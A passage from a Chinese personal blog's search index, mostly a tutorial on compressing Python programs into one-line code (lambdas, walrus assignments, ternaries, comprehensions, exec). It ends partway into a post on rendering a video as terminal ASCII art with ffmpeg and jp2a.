","link":"https://jackgdn.github.io/post/python%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%BB%A3%E7%A0%81-pt-2/","section":"post","tags":["Python"],"title":"Python 一句话代码技巧（二）"},{"body":"我还在学习 CTF 时，我接触到了一些 Python 的有趣特性，例如使用 NFKC 进行沙箱逃逸以及 Python 存储对象时的一些机制。最近我对 Python 的“一句话代码”产生了兴趣，具体来说就是使用一些特别的 Python 编程技巧以及语法糖将大段代码压缩到一行或少数几行中，用几行短短的代码（但是每一行都会很长）实现一个完整的功能。例如说下面这三行代码分别时冒泡排序、选择排序和插入排序算法的“一句话代码”形式。\n1print((bubble_sort := lambda lst: ([(tmp := lst.__getitem__(i), lst.__setitem__(i, lst.__getitem__(j)), lst.__setitem__(j, tmp), None)[-1] for i in range(len(lst) - 1) for j in range(i, len(lst)) if lst[j] \u0026lt; lst[i]] + lst)[-len(lst):])([int(i) for i in input().split()])) 2# 冒泡排序 3 4print((selection_sort := lambda lst: ([(index := i, j := i + 1, index := (my_while := lambda index, lst, j: my_while(index := j if lst[j] \u0026lt; lst[index] else index, lst, j := j + 1) if j \u0026lt; len(lst) else index)(index, lst, j), tmp := lst.__getitem__(i), lst.__setitem__(i, lst.__getitem__(index)), lst.__setitem__(index, tmp), None) for i in range(len(lst) - 1)] + lst)[-len(lst):])([int(i) for i in input().split()])) 5# 选择排序 6 7print((insertion_sort := lambda lst: ([(key := lst.__getitem__(i), j := i - 1, j := (my_while := lambda j, key, lst: (lst.__setitem__(j + 1, lst.__getitem__(j)), j := j - 1, my_while(j, key, lst))[-1] if j \u0026gt;= 0 and lst[j] \u0026gt; key else j)(j, key, lst), lst.__setitem__(j + 1, key), None)[-1] for i in range(1, len(lst))] + lst)[-len(lst):])([int(i) for i in input().split()])) 8# 插入排序 下面这一段代码是我曾经的一次 OOP 编程作业，正常写出来的代码是这样的（以前知识储备不够，现在看上去这段代码有很多可以优化的部分）：\n1class Book: 2 3 def __init__(self, code, title, status=True): 4 self.__code = code 5 self.__title = title 6 self.__status = status 7 8 def get_book_code(self): 9 return self.__code 10 11 def get_book_title(self): 12 return self.__title 13 14 def is_available(self): 15 return self.__status 16 17 def borrow_book(self): 18 self.__status = False 19 20 def return_book(self): 21 self.__status = True 22 23 def __str__(self): 24 return f\u0026#34;{self.__title}, {self.__code} ({[\u0026#39;Available\u0026#39; if self.is_available() else \u0026#39;On Loan\u0026#39;][0]})\u0026#34; 25 26 27class Member: 28 29 def __init__(self, member_id, name, on_loan_books_list=None): 30 self.__member_id = member_id 31 self.__name = name 32 if on_loan_books_list is None: 33 self.__on_loan_books_list = list() 34 else: 35 self.__on_loan_books_list = on_loan_books_list 36 37 def get_name(self): 38 return self.__name 39 40 def get_member_id(self): 41 return self.__member_id 42 43 def get_on_loan_books(self): 44 return self.__on_loan_books_list 45 46 def borrow_book(self, book): 47 self.__on_loan_books_list.append(book.get_book_title()) 48 book.borrow_book() 49 50 def return_book(self, book): 51 self.__on_loan_books_list.remove(book.get_book_title()) 52 book.return_book() 53 54 def __str__(self): 55 return \u0026#34;{}\\nOn loan book(s):\\n{}\u0026#34;.format( 56 self.__name, 57 [ 58 ( 59 \u0026#34;\\n\u0026#34;.join(self.__on_loan_books_list) 60 if len(self.__on_loan_books_list) \u0026gt; 0 61 else \u0026#34;-\u0026#34; 62 ) 63 ][0], 64 ) 65 66 67class Record: 68 69 def __init__(self, book, member, issue_date, is_on_loan=True): 70 self.__book = book 71 self.__member = member 72 self.__issue_date = issue_date 73 self.__is_on_loan = is_on_loan 74 self.__member.borrow_book(self.__book) 75 76 def get_member_id(self): 77 return self.__member.get_member_id() 78 79 def get_book_code(self): 80 return self.__book.get_book_code() 81 82 def get_issue_date(self): 83 return self.__issue_date 84 85 def is_on_loan(self): 86 return self.__is_on_loan 87 88 def return_book(self): 89 self.__member.return_book(self.__book) 90 self.__is_on_loan = False 91 92 def __str__(self): 93 member_name = self.__member.get_name() 94 book_title = self.__book.get_book_title() 95 book_code = self.__book.get_book_code() 96 book_status = [\u0026#34;Available\u0026#34; if self.__book.is_available() else \u0026#34;On Loan\u0026#34;][0] 97 issue_date = self.get_issue_date() 98 return f\u0026#34;{member_name}, {book_title}, {book_code} ({book_status}), issued date={issue_date}\u0026#34; 99 100 def get_member_name(self): 101 return self.__member.get_name() 102 103 def get_book_title(self): 104 return self.__book.get_book_title() 105 106 107class MyLibrary: 108 109 def __init__(self, books_list_file_path, on_loan_records_list=None): 110 try: 111 with open(books_list_file_path, \u0026#34;r\u0026#34;) as books_list_file: 112 self.__books_list = books_list_file.readlines() 113 except FileNotFoundError: 114 print(f\u0026#34;ERROR: The file \u0026#39;{books_list_file_path}\u0026#39; does not exist.\u0026#34;) 115 exit(-1) 116 117 self.__books_list_with_class = list() 118 for book_string in self.__books_list: 119 book_code = book_string.split(\u0026#34;,\u0026#34;)[0] 120 book_title = book_string.split(\u0026#34;,\u0026#34;)[1] 121 self.__books_list_with_class.append( 122 Book(book_code, \u0026#34;\u0026#34;.join(book_title.split(\u0026#34;\\n\u0026#34;))) 123 ) 124 print(f\u0026#34;{len(self.__books_list_with_class)} books loaded.\u0026#34;) 125 126 if on_loan_records_list is None: 127 self.__on_loan_records_list = list() 128 else: 129 self.__on_loan_records_list = on_loan_records_list 130 131 self.__all_records_list = list() 132 133 def show_all_books(self): 134 books_information = [] 135 for book in self.__books_list_with_class: 136 book_title = book.get_book_title() 137 book_code = book.get_book_code() 138 book_status = [\u0026#34;Available\u0026#34; if book.is_available() else \u0026#34;On Loan\u0026#34;][0] 139 books_information.append(f\u0026#34;{book_title}, {book_code} ({book_status})\u0026#34;) 140 print(\u0026#34;\\n\u0026#34;.join(books_information)) 141 142 def find_book(self, code): 143 find = False 144 for book in self.__books_list_with_class: 145 if code == book.get_book_code(): 146 find = True 147 if book.is_available(): 148 return book 149 else: 150 return None 151 if not find: 152 return None 153 154 def borrow_book(self, book: Book, member: Member, issue_date): 155 if book is None: 156 print(\u0026#34;ERROR: could not issue the book.\u0026#34;) 157 elif book.is_available(): 158 self.__all_records_list.append(Record(book, member, issue_date)) 159 self.__on_loan_records_list.append(self.__all_records_list[-1]) 160 book_title = book.get_book_title() 161 member_name = member.get_name() 162 print(f\u0026#34;{book_title} is borrowed by {member_name}.\u0026#34;) 163 164 def show_available_books(self): 165 for book in self.__books_list_with_class: 166 if book.get_book_code() not in [ 167 record.get_book_code() for record in self.__on_loan_records_list 168 ]: 169 print(book) 170 171 def find_record(self, code): 172 for record in self.__on_loan_records_list: 173 if record.get_book_code() == code and record.is_on_loan(): 174 return record 175 return None 176 177 def return_book(self, record: Record): 178 if record is None: 179 print(\u0026#34;ERROR: could not return the book.\u0026#34;) 180 elif record.is_on_loan(): 181 record_index = self.__all_records_list.index(record) 182 self.__all_records_list[record_index].return_book() 183 self.__all_records_list[record_index] = record 184 self.__on_loan_records_list.remove(record) 185 print(f\u0026#34;{record.get_book_code()} is returned successfully.\u0026#34;) 186 187 def show_on_loan_records(self): 188 for record in self.__on_loan_records_list: 189 member_name = record.get_member_name() 190 book_title = record.get_book_title() 191 book_code = record.get_book_code() 192 book_issue_date = record.get_issue_date() 193 print( 194 f\u0026#34;{member_name}, {book_title}, {book_code} (On Loan), issued date={book_issue_date}\u0026#34; 195 ) 196 197 def show_all_records(self): 198 for record in self.__all_records_list: 199 member_name = record.get_member_name() 200 book_title = record.get_book_title() 201 book_code = record.get_book_code() 202 book_issue_date = record.get_issue_date() 203 book_status = [\u0026#34;On Loan\u0026#34; if record.is_on_loan() else \u0026#34;Available\u0026#34;][0] 204 print( 205 f\u0026#34;{member_name}, {book_title}, {book_code} ({book_status}), issued date={book_issue_date}\u0026#34; 206 ) 这段代码实现了一个简易的图书管理系统，有增删改查的功能。下面是把这段代码以及测试样例压缩到一行的样子：\n1(lambda Book, Member, Record, MyLibrary: (library := MyLibrary(\u0026#34;simple_books.txt\u0026#34;), m1 := Member(1001, \u0026#34;Michael\u0026#34;), library.borrow_book(library.find_book(\u0026#34;QS12.02.003\u0026#34;), m1, \u0026#34;2020-08-12\u0026#34;), library.borrow_book(library.find_book(\u0026#34;QK12.04.002\u0026#34;), m1, \u0026#34;2020-08-15\u0026#34;), library.show_on_loan_records(), ))(Book := type(\u0026#34;Book\u0026#34;, (), {\u0026#34;__init__\u0026#34;: lambda self, code, title, status=True: (setattr(self, \u0026#34;_Book__code\u0026#34;, code), setattr(self, \u0026#34;_Book__title\u0026#34;, title), setattr(self, \u0026#34;_Book__status\u0026#34;, status), None, )[-1], \u0026#34;get_book_code\u0026#34;: lambda self: getattr(self, \u0026#34;_Book__code\u0026#34;), \u0026#34;get_book_title\u0026#34;: lambda self: getattr(self, \u0026#34;_Book__title\u0026#34;), \u0026#34;is_available\u0026#34;: lambda self: getattr(self, \u0026#34;_Book__status\u0026#34;), \u0026#34;borrow_book\u0026#34;: lambda self: (setattr(self, \u0026#34;_Book__status\u0026#34;, False), None)[-1], \u0026#34;return_book\u0026#34;: lambda self: (setattr(self, \u0026#34;_Book__status\u0026#34;, True), None)[-1], \u0026#34;__str__\u0026#34;: lambda self: \u0026#34;{}, {} ({})\u0026#34;.format(self.get_book_title(), self.get_book_code(), \u0026#34;Available\u0026#34; if self.is_available() else \u0026#34;On Loan\u0026#34;, ), }, ), type(\u0026#34;Member\u0026#34;, (), {\u0026#34;__init__\u0026#34;: lambda self, member_id, name, on_loan_books_list=None: (setattr(self, \u0026#34;_Member__member_id\u0026#34;, member_id), setattr(self, \u0026#34;_Member__name\u0026#34;, name), setattr(self, \u0026#34;_Member__on_loan_books_list\u0026#34;, on_loan_books_list if on_loan_books_list else list(), ), None, )[-1], \u0026#34;get_name\u0026#34;: lambda self: getattr(self, \u0026#34;_Member__name\u0026#34;), \u0026#34;get_member_id\u0026#34;: lambda self: getattr(self, \u0026#34;_Member__member_id\u0026#34;), \u0026#34;get_on_loan_books\u0026#34;: lambda self: getattr(self, \u0026#34;_Member__on_loan_books_list\u0026#34;), \u0026#34;borrow_book\u0026#34;: lambda self, book: (self._Member__on_loan_books_list.append(book.get_book_title()), book.borrow_book(), None, )[-1], \u0026#34;return_book\u0026#34;: lambda self, book: (self._Member__on_loan_books_list.remove(book.get_book_title()), book.return_book(), None, )[-1], \u0026#34;__str__\u0026#34;: lambda self: \u0026#34;{}\\nOn loan book(s):\\n{}\u0026#34;.format(self.get_name(), (\u0026#34;\\n\u0026#34;.join(self.get_on_loan_books()) if len(self.get_on_loan_books()) \u0026gt; 0 else \u0026#34;-\u0026#34;), ), }, ), Record := type(\u0026#34;Record\u0026#34;, (), {\u0026#34;__init__\u0026#34;: lambda self, book, member, issue_date, is_on_loan=True: (setattr(self, \u0026#34;_Record__book\u0026#34;, book), setattr(self, \u0026#34;_Record__member\u0026#34;, member), setattr(self, \u0026#34;_Record__issue_date\u0026#34;, issue_date), setattr(self, \u0026#34;_Record__is_on_loan\u0026#34;, is_on_loan), self._Record__member.borrow_book(self._Record__book), None, )[-1], \u0026#34;get_member_id\u0026#34;: lambda self: self._Record__member.get_member_id(), \u0026#34;get_book_code\u0026#34;: lambda self: self._Record__book.get_book_code(), \u0026#34;get_issue_date\u0026#34;: lambda self: getattr(self, \u0026#34;_Record__issue_date\u0026#34;), \u0026#34;is_on_loan\u0026#34;: lambda self: getattr(self, \u0026#34;_Record__is_on_loan\u0026#34;), \u0026#34;return_book\u0026#34;: lambda self: (self._Record__member.return_book(self._Record__book), None, )[-1], \u0026#34;get_member_name\u0026#34;: lambda self: self._Record__member.get_name(), \u0026#34;get_book_title\u0026#34;: lambda self: self._Record__book.get_book_title(), \u0026#34;__str__\u0026#34;: lambda self: \u0026#34;{}, {}, {} ({}), issued date={}\u0026#34;.format(self._Record__member.get_name(), self._Record__book.get_book_title(), self._Record__book.get_book_code(), \u0026#34;Available\u0026#34; if self._Record__book.is_available() else \u0026#34;On Loan\u0026#34;, self.get_issue_date(), ), }, ), type(\u0026#34;MyLibrary\u0026#34;, (), {\u0026#34;__init__\u0026#34;: lambda self, books_list_file_path, on_loan_records_list=None: ((setattr(self, \u0026#34;_MyLibrary__books_list\u0026#34;, open(books_list_file_path, \u0026#34;r\u0026#34;).read().splitlines(), ) if __import__(\u0026#34;os\u0026#34;).path.exists(books_list_file_path) else (print(f\u0026#34;ERROR: The file \u0026#39;{books_list_file_path}\u0026#39; does not exist.\u0026#34;), __import__(\u0026#34;sys\u0026#34;).exit(-1), )), setattr(self, \u0026#34;_MyLibrary__books_list_with_class\u0026#34;, [Book(*book.split(\u0026#34;,\u0026#34;)) for book in self._MyLibrary__books_list], ), print(f\u0026#34;{len(self._MyLibrary__books_list_with_class)} books loaded.\u0026#34;), setattr(self, \u0026#34;_MyLibrary__on_loan_records_list\u0026#34;, on_loan_records_list if on_loan_records_list else list(), ), None, )[-1], \u0026#34;show_all_books\u0026#34;: lambda self: (print(\u0026#34;\\n\u0026#34;.join(\u0026#34;{}, {} ({})\u0026#34;.format(book.get_book_title(), book.get_book_code(), \u0026#34;Available\u0026#34; if book.is_available() else \u0026#34;On Loan\u0026#34;, ) for book in self._MyLibrary__books_list_with_class)), None, )[-1], \u0026#34;find_book\u0026#34;: lambda self, code: next((book for book in self._MyLibrary__books_list_with_class if code == book.get_book_code() and book.is_available()), (None if any(code == book.get_book_code() for book in self._MyLibrary__books_list_with_class) else None), ), \u0026#34;borrow_book\u0026#34;: lambda self, book, member, issue_date: ((print(\u0026#34;ERROR: could not issue the book.\u0026#34;) if book is None else ((self._MyLibrary__on_loan_records_list.append(Record(book, member, issue_date)), print(f\u0026#34;{book.get_book_title()} is borrowed by {member.get_name()}\u0026#34;), ) if book.is_available() else None)), None, )[-1], \u0026#34;show_available_books\u0026#34;: lambda self: ((list(map(lambda book: print(book), filter(lambda book: book.get_book_code() not in [record.get_book_code() for record in self._MyLibrary__on_loan_records_list], self._MyLibrary__books_list_with_class, ), ))), None, )[-1], \u0026#34;find_record\u0026#34;: lambda self, code: next((record for record in self._MyLibrary__on_loan_records_list if record.get_book_code() == code and record.is_on_loan()), None, ), \u0026#34;return_book\u0026#34;: lambda self, record: (((print(\u0026#34;ERROR: could not return the book.\u0026#34;) if record is None else None) if not record.is_on_loan() else (record.return_book(), self._MyLibrary__on_loan_records_list.remove(record), print(f\u0026#34;{record.get_book_code()} is returned successfully.\u0026#34;), )), None, )[-1], \u0026#34;show_on_loan_records\u0026#34;: lambda self: (list(map(lambda record: print(\u0026#34;{}, {}, {} (On Loan), issued date={}\u0026#34;.format(record.get_member_name(), record.get_book_title(), record.get_book_code(), record.get_issue_date(), ), ), self._MyLibrary__on_loan_records_list, )), None, )[-1], }, ), ) 这行代码一共有 5526 个字符，下面是把它格式化后的样子：\n1( 2 lambda Book, Member, Record, MyLibrary: ( 3 library := MyLibrary(\u0026#34;simple_books.txt\u0026#34;), 4 m1 := Member(1001, \u0026#34;Michael\u0026#34;), 5 library.borrow_book(library.find_book(\u0026#34;QS12.02.003\u0026#34;), m1, \u0026#34;2020-08-12\u0026#34;), 6 library.borrow_book(library.find_book(\u0026#34;QK12.04.002\u0026#34;), m1, \u0026#34;2020-08-15\u0026#34;), 7 library.show_on_loan_records(), 8 ) 9)( 10 Book := type( 11 \u0026#34;Book\u0026#34;, 12 (), 13 { 14 \u0026#34;__init__\u0026#34;: lambda self, code, title, status=True: ( 15 setattr(self, \u0026#34;_Book__code\u0026#34;, code), 16 setattr(self, \u0026#34;_Book__title\u0026#34;, title), 17 setattr(self, \u0026#34;_Book__status\u0026#34;, status), 18 None, 19 )[-1], 20 \u0026#34;get_book_code\u0026#34;: lambda self: getattr(self, \u0026#34;_Book__code\u0026#34;), 21 \u0026#34;get_book_title\u0026#34;: lambda self: getattr(self, \u0026#34;_Book__title\u0026#34;), 22 \u0026#34;is_available\u0026#34;: lambda self: getattr(self, \u0026#34;_Book__status\u0026#34;), 23 \u0026#34;borrow_book\u0026#34;: lambda self: (setattr(self, \u0026#34;_Book__status\u0026#34;, False), None)[ 24 -1 25 ], 26 \u0026#34;return_book\u0026#34;: lambda self: (setattr(self, \u0026#34;_Book__status\u0026#34;, True), None)[ 27 -1 28 ], 29 \u0026#34;__str__\u0026#34;: lambda self: \u0026#34;{}, {} ({})\u0026#34;.format( 30 self.get_book_title(), 31 self.get_book_code(), 32 \u0026#34;Available\u0026#34; if self.is_available() else \u0026#34;On Loan\u0026#34;, 33 ), 34 }, 35 ), 36 type( 37 \u0026#34;Member\u0026#34;, 38 (), 39 { 40 \u0026#34;__init__\u0026#34;: lambda self, member_id, name, on_loan_books_list=None: ( 41 setattr(self, \u0026#34;_Member__member_id\u0026#34;, member_id), 42 setattr(self, \u0026#34;_Member__name\u0026#34;, name), 43 setattr( 44 self, 45 \u0026#34;_Member__on_loan_books_list\u0026#34;, 46 on_loan_books_list if on_loan_books_list else list(), 47 ), 48 None, 49 )[-1], 50 \u0026#34;get_name\u0026#34;: lambda self: getattr(self, \u0026#34;_Member__name\u0026#34;), 51 \u0026#34;get_member_id\u0026#34;: lambda self: getattr(self, \u0026#34;_Member__member_id\u0026#34;), 52 \u0026#34;get_on_loan_books\u0026#34;: lambda self: getattr( 53 self, \u0026#34;_Member__on_loan_books_list\u0026#34; 54 ), 55 \u0026#34;borrow_book\u0026#34;: lambda self, book: ( 56 self._Member__on_loan_books_list.append(book.get_book_title()), 57 book.borrow_book(), 58 None, 59 )[-1], 60 \u0026#34;return_book\u0026#34;: lambda self, book: ( 61 self._Member__on_loan_books_list.remove(book.get_book_title()), 62 book.return_book(), 63 None, 64 )[-1], 65 \u0026#34;__str__\u0026#34;: lambda self: \u0026#34;{}\\nOn loan book(s):\\n{}\u0026#34;.format( 66 self.get_name(), 67 ( 68 \u0026#34;\\n\u0026#34;.join(self.get_on_loan_books()) 69 if len(self.get_on_loan_books()) \u0026gt; 0 70 else \u0026#34;-\u0026#34; 71 ), 72 ), 73 }, 74 ), 75 Record := type( 76 \u0026#34;Record\u0026#34;, 77 (), 78 { 79 \u0026#34;__init__\u0026#34;: lambda self, book, member, issue_date, is_on_loan=True: ( 80 setattr(self, \u0026#34;_Record__book\u0026#34;, book), 81 setattr(self, \u0026#34;_Record__member\u0026#34;, member), 82 setattr(self, \u0026#34;_Record__issue_date\u0026#34;, issue_date), 83 setattr(self, \u0026#34;_Record__is_on_loan\u0026#34;, is_on_loan), 84 self._Record__member.borrow_book(self._Record__book), 85 None, 86 )[-1], 87 \u0026#34;get_member_id\u0026#34;: lambda self: self._Record__member.get_member_id(), 88 \u0026#34;get_book_code\u0026#34;: lambda self: self._Record__book.get_book_code(), 89 \u0026#34;get_issue_date\u0026#34;: lambda self: getattr(self, \u0026#34;_Record__issue_date\u0026#34;), 90 \u0026#34;is_on_loan\u0026#34;: lambda self: getattr(self, \u0026#34;_Record__is_on_loan\u0026#34;), 91 \u0026#34;return_book\u0026#34;: lambda self: ( 92 self._Record__member.return_book(self._Record__book), 93 None, 94 )[-1], 95 \u0026#34;get_member_name\u0026#34;: lambda self: self._Record__member.get_name(), 96 \u0026#34;get_book_title\u0026#34;: lambda self: self._Record__book.get_book_title(), 97 \u0026#34;__str__\u0026#34;: lambda self: \u0026#34;{}, {}, {} ({}), issued date={}\u0026#34;.format( 98 self._Record__member.get_name(), 99 self._Record__book.get_book_title(), 100 self._Record__book.get_book_code(), 101 \u0026#34;Available\u0026#34; if self._Record__book.is_available() else \u0026#34;On Loan\u0026#34;, 102 self.get_issue_date(), 103 ), 104 }, 105 ), 106 type( 107 \u0026#34;MyLibrary\u0026#34;, 108 (), 109 { 110 \u0026#34;__init__\u0026#34;: lambda self, books_list_file_path, on_loan_records_list=None: ( 111 ( 112 setattr( 113 self, 114 \u0026#34;_MyLibrary__books_list\u0026#34;, 115 open(books_list_file_path, \u0026#34;r\u0026#34;).read().splitlines(), 116 ) 117 if __import__(\u0026#34;os\u0026#34;).path.exists(books_list_file_path) 118 else ( 119 print( 120 f\u0026#34;ERROR: The file \u0026#39;{books_list_file_path}\u0026#39; does not exist.\u0026#34; 121 ), 122 __import__(\u0026#34;sys\u0026#34;).exit(-1), 123 ) 124 ), 125 setattr( 126 self, 127 \u0026#34;_MyLibrary__books_list_with_class\u0026#34;, 128 [Book(*book.split(\u0026#34;,\u0026#34;)) for book in self._MyLibrary__books_list], 129 ), 130 print(f\u0026#34;{len(self._MyLibrary__books_list_with_class)} books loaded.\u0026#34;), 131 setattr( 132 self, 133 \u0026#34;_MyLibrary__on_loan_records_list\u0026#34;, 134 on_loan_records_list if on_loan_records_list else list(), 135 ), 136 None, 137 )[-1], 138 \u0026#34;show_all_books\u0026#34;: lambda self: ( 139 print( 140 \u0026#34;\\n\u0026#34;.join( 141 \u0026#34;{}, {} ({})\u0026#34;.format( 142 book.get_book_title(), 143 book.get_book_code(), 144 \u0026#34;Available\u0026#34; if book.is_available() else \u0026#34;On Loan\u0026#34;, 145 ) 146 for book in self._MyLibrary__books_list_with_class 147 ) 148 ), 149 None, 150 )[-1], 151 \u0026#34;find_book\u0026#34;: lambda self, code: next( 152 ( 153 book 154 for book in self._MyLibrary__books_list_with_class 155 if code == book.get_book_code() and book.is_available() 156 ), 157 ( 158 None 159 if any( 160 code == book.get_book_code() 161 for book in self._MyLibrary__books_list_with_class 162 ) 163 else None 164 ), 165 ), 166 \u0026#34;borrow_book\u0026#34;: lambda self, book, member, issue_date: ( 167 ( 168 print(\u0026#34;ERROR: could not issue the book.\u0026#34;) 169 if book is None 170 else ( 171 ( 172 self._MyLibrary__on_loan_records_list.append( 173 Record(book, member, issue_date) 174 ), 175 print( 176 f\u0026#34;{book.get_book_title()} is borrowed by {member.get_name()}\u0026#34; 177 ), 178 ) 179 if book.is_available() 180 else None 181 ) 182 ), 183 None, 184 )[-1], 185 \u0026#34;show_available_books\u0026#34;: lambda self: ( 186 ( 187 list( 188 map( 189 lambda book: print(book), 190 filter( 191 lambda book: book.get_book_code() 192 not in [ 193 record.get_book_code() 194 for record in self._MyLibrary__on_loan_records_list 195 ], 196 self._MyLibrary__books_list_with_class, 197 ), 198 ) 199 ) 200 ), 201 None, 202 )[-1], 203 \u0026#34;find_record\u0026#34;: lambda self, code: next( 204 ( 205 record 206 for record in self._MyLibrary__on_loan_records_list 207 if record.get_book_code() == code and record.is_on_loan() 208 ), 209 None, 210 ), 211 \u0026#34;return_book\u0026#34;: lambda self, record: ( 212 ( 213 ( 214 print(\u0026#34;ERROR: could not return the book.\u0026#34;) 215 if record is None 216 else None 217 ) 218 if not record.is_on_loan() 219 else ( 220 record.return_book(), 221 self._MyLibrary__on_loan_records_list.remove(record), 222 print(f\u0026#34;{record.get_book_code()} is returned successfully.\u0026#34;), 223 ) 224 ), 225 None, 226 )[-1], 227 \u0026#34;show_on_loan_records\u0026#34;: lambda self: ( 228 list( 229 map( 230 lambda record: print( 231 \u0026#34;{}, {}, {} (On Loan), issued date={}\u0026#34;.format( 232 record.get_member_name(), 233 record.get_book_title(), 234 record.get_book_code(), 235 record.get_issue_date(), 236 ), 237 ), 238 self._MyLibrary__on_loan_records_list, 239 ) 240 ), 241 None, 242 )[-1], 243 }, 244 ), 245) 作为一门缩进敏感的语言，试图将 Python 代码是颇具挑战性的。下面我介绍一些能够压缩 Python 代码行数（但是会拓宽列数）的技巧。\n使用分号在同一行内写多个语句 例如对于下面两行代码：\n1s = \u0026#34;Hello,\u0026#34; 2print(f\u0026#34;{s} World!\u0026#34;) 3 4# output: Hello, World! 我们可以写成\n1s = \u0026#34;Hello,\u0026#34;; print(f\u0026#34;{s} World!\u0026#34;) 2 3# output: Hello, World! 上面两部分代码的功能完全一样。不过使用分号在一行内写多个语句也有局限性，诸如条件语句、循环语句等部分带有关键字的语句无法使用分号。例如下面这段代码：\n1value = 7 2count = 0 3lst = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10] 4for i in lst: 5 if i \u0026gt; value: 6 count += 1 7print(count) 8 9# output: 4 就不能直接写成\n1value = 7; count = 0; lst = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10]; for i in lst: if i \u0026gt; value: count += 1; print(count) 2 3# STDERR: SyntaxError: invalid syntax 当然，将上面代码压缩至一行的方法我们稍后会提。\n使用 exec() 函数 作为一门解释性语言，Python 允许我们将代码写进一个字符串并且执行，例如说：\n1exec(\u0026#34;for i in range(13):\\n\\tprint(i)\u0026#34;) 这一行代码一次输出 1 到 12。根据这个原理，我们可以将任何一大段脚本内所有的换行、缩进转换为转义字符，随后将这个字符串作为参数执行 exec() 函数即可。\n前面提到的两种方法，单独使用时并没有很高的技术含量，只是将原来代码的格式略微改变一下，下面我将介绍几种更具有技术力的“一句话代码”技巧。\n三元表达式（一句话 if-else 语句） Python 中 if 语句的定义如下：\n1if_stmt ::= \u0026#34;if\u0026#34; assignment_expression \u0026#34;:\u0026#34; suite 2 (\u0026#34;elif\u0026#34; assignment_expression \u0026#34;:\u0026#34; suite)* 3 [\u0026#34;else\u0026#34; \u0026#34;:\u0026#34; suite] 一般情况下使用方法如下：\n1if assignment_expression_A: 2 suite_A 3elif assignment_expression_B: 4 suite_B 5elif assignment_expression_C: 6 suite_C 7else: 8 suite_D 将其写为一行后就是：\n1siute_A if assignment_expression_A else suite_B if assignment_expression_B else suite_C if assignment_expression_C else suite_D 其中 elif 的部分可以无限叠加。但是一句话格式下必须有 else 关键字，如果原代码中没有 else 部分，则在一句话格式下在 else 后使用缺省值，一般是 None 或者任何具用于表示“无”的数据。\n我们举几个例子：\n1a = 13 2b = 33 3if a \u0026gt; b: 4 max_value = a 5else: 6 max_value = b 7print(max_value) 8 9# output: 33 改写条件语句的部分\n1a = 13 2b = 33 3print(a if a \u0026gt; b else b) 4 5# output: 33 如果我们再给原代码加上判断是否相等的部分\n1a = 13 2b = 33 3if a \u0026gt; b: 4 print(f\u0026#34;{a} is bigger.\u0026#34;) 5elif a \u0026lt; b: 6 print(f\u0026#34;{b} is bigger.\u0026#34;) 7else: 8 print(f\u0026#34;They are equal.\u0026#34;) 9 10# output: 33 is higher. 这段代码则可以改写成\n1a = 13; b = 33; print(f\u0026#34;{a} is bigger.\u0026#34;) if a \u0026gt; b else print(f\u0026#34;{b} is bigger.\u0026#34;) if a \u0026lt; b else print(f\u0026#34;They are equal.\u0026#34;) 2 3# output: 33 is higher. 推导式 for Python 中的推导式分为列表推导式、字典推导式、集合推导式和生成器表达式（亦称作元组推导式），他们的语法类似，最大的区别就是生成不同的对象。这四种推导式分别生成列表、字典、集合和生成器对象。\n列表推导式基本语法为：\n1[out_exp_res for out_exp in input_list] 2# 或者 3[out_exp_res for out_exp in input_list if condition] 4# if 语句要放在最后 集合推导式、生成器表达式只是分别将其中的中括号换为了大括号和小括号。而字典推导式的基本语法为：\n1{key_expr: value_expr for value in collection} 2# 或者 3{key_expr: value_expr for value in collection if condition} 4# if 永远后置 例如说对于下面这段用于找出列表中大于指定值的数字的代码：\n1value = 7 2result = [] 3numbers = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10] 4for i in numbers: 5 if i \u0026gt; value: 6 result.append(i) 7print(result) 8 9# output: [9, 9, 8, 10] 我们可以使用列表推导式完成这个任务：\n1value = 7 2numbers = [1, 1, 4, 5, 1, 4, 1, 9, 1, 9, 8, 10] 3result = [i for i in number if i \u0026gt; value] 4print(result) 5 6# output: [9, 9, 8, 10] 推导式还支持循环嵌套。例如说下面这个集合推导式可以用于求两个集合的 Cartesian product：\n1cartesian_product = {(x, y) for x in {1, 3, 5} for y in {0, 2, 4}} 2print(cartesian_product) 3 4# output: {(1, 2), (3, 4), (5, 4), (1, 4), (3, 0), (5, 0), (1, 0), (3, 2), (5, 2)} 我们还可以使用 Cantor pairing 将这些有序数对存储到字典里：\n1cantor_pairing = {(x + y) * (x + y + 1) // 2 + y: (x, y) for (x, y) in {(x, y) for x in {1, 3, 5} for y in {0, 2, 4}}} 2print(cantor_pairing) 3 4# output: {8: (1, 2), 32: (3, 4), 49: (5, 4), 19: (1, 4), 6: (3, 0), 15: (5, 0), 1: (1, 0), 17: (3, 2), 30: (5, 2)} 这里在字典推导式中嵌套了集合推导式。\n","link":"https://jackgdn.github.io/post/python%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%BB%A3%E7%A0%81-pt-1/","section":"post","tags":["Python"],"title":"Python 一句话代码技巧（一）"},{"body":"","link":"https://jackgdn.github.io/tags/c++/","section":"tags","tags":null,"title":"C++"},{"body":"","link":"https://jackgdn.github.io/tags/linux/","section":"tags","tags":null,"title":"Linux"},{"body":"","link":"https://jackgdn.github.io/categories/linux/","section":"categories","tags":null,"title":"Linux"},{"body":"之前见过使用 telnet towel.blinkenlights.nl 命令在终端中播放《星球大战》。于是想自己也做一个。我选择的是《米奇妙妙屋》的片头。\n我的思路是这样的：下载视频 -\u0026gt; 将视频提取成一张张图片 -\u0026gt; 将图片转化为像素画 -\u0026gt; 连续播放像素画 -\u0026gt; 放到服务器上使其他人也可以连接\n视频切片 使用 FFmpeg 工具将视频切片。我选择将帧率定为 16，即每秒钟播放 16 张“图片”。如果帧率太高，终端会由于自身绘制速度及网络带宽导致刷新缓慢，进而导致视频看起来“很慢”。最后尝试时，Electerm 以及 Termux 的表现都很差，而 Windows 原生的 Shell（无论是 cmd 还是 Powershell）都有更优秀的表现。\n使用 FFmpeg 视频切片的命令如下：\n1sudo ffmpeg -i vid/vid.mp4 -vf fps=16 pic/frame_%04d.png 参数 解释 -i 输入文件 -v 设置视频限制 执行完上面的命令，我得到了 1354 张图片，这些图片名称依次为 frame_0001.png 到 frame_1354.png。\n图像转字符 我使用 jp2a 工具将图片转化为字符。命令为：\n1counter=1; 2for img in pic/frame_*.png; do 3 sudo jp2a --colors --color-depth=24 --height=77 